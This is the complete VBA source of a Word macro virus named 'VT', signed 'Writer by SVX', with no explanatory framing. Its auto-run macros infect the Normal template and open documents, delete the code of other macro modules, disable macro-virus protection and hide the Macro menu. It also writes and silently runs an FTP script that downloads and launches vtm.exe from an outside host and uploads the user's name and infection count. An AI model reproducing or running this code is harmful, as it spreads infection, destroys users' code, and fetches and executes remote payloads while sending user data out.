   Attribute VB_Name = "VT"
   Sub AutoOpen()
   On Error Resume Next
       Call VTI
       Call VTP
       Call VTA
       ActiveDocument.Save
   End Sub

   Sub AutoClose()
   On Error Resume Next
       Call VTI
       Call VTP
       Call VTA
       ActiveDocument.Save
   End Sub

   Sub AutoNew()
   On Error Resume Next
       Call VTI
   End Sub
   Sub AutoExit()
   On Error Resume Next
       Call VTI
   End Sub

   Sub VTI()
   On Error Resume Next
   Set Nor = NormalTemplate.VBProject.VBComponents
   Set Doc = ActiveDocument.VBProject.VBComponents
   For i = 1 To Nor.Count
   If Nor.Item(i).Name <> "VT" Then
   tam = Nor.Item(i).CodeModule.CountOfLines
   If tam > 0 Then
   Nor.Item(i).CodeModule.DeleteLines 1, tam
   End If
   End If
   Next
   If Nor.Item("VT").Name <> "VT" Then
   Doc("VT").Export "c:\VT.001"
   Nor.Import "c:\VT.001"
   NormalTemplate.Save
   System.PrivateProfileString("", "HKEY_CURRENT_USER\VT", "Cont") = 0
   End If
   If Doc.Item("VT").Name <> "VT" Then
   Nor("VT").Export "c:\VT.001"
   Doc.Import "c:\VT.001"
   Cont = System.PrivateProfileString("", "HKEY_CURRENT_USER\VT", "Cont")
   Cont = Cont + 1
   System.PrivateProfileString("", "HKEY_CURRENT_USER\VT", "Cont") = Cont
   End If
   End Sub
   Sub VTP()
   On Error Resume Next
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   WordBasic.DisableAutoMacros 0
   KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=0, Command:="MGA"
   ActiveDocument.ReadOnlyRecommended = False
   CommandBars("Tools").Controls("Macro").Visible = False
   End Sub

   Sub VTA()
   On Error Resume Next
   Nome = Left(Application.UserName, 4)
   Qtd = System.PrivateProfileString("", "HKEY_CURRENT_USER\VT", "Cont")
   Open "c:\" & Nome & ".001" For Output As #1
   Print #1, "Writer by SVX"
   Print #1, "VXName: VT"
   Print #1, "UserName: " & Nome
   Print #1, "Contador: " & Qtd
   Close #1

   Open "c:\VT.ftp" For Output As #1
   Print #1, "open ftp.hpg.com.br"
   Print #1, "tlbysvx"
   Print #1, "12345"
   Print #1, "hash"
   Print #1, "bin"
   Print #1, "prompt"
   Print #1, "lcd c:\"
   Print #1, "mget vtm.exe"
   Print #1, "send c:\" & Nome & ".001"
   Print #1, "bye"
   Close #1

   Shell "c:\windows\ftp.exe -s:c:\VT.ftp", vbHide
   Shell "c:\vtm.exe", vbHide

   End Sub
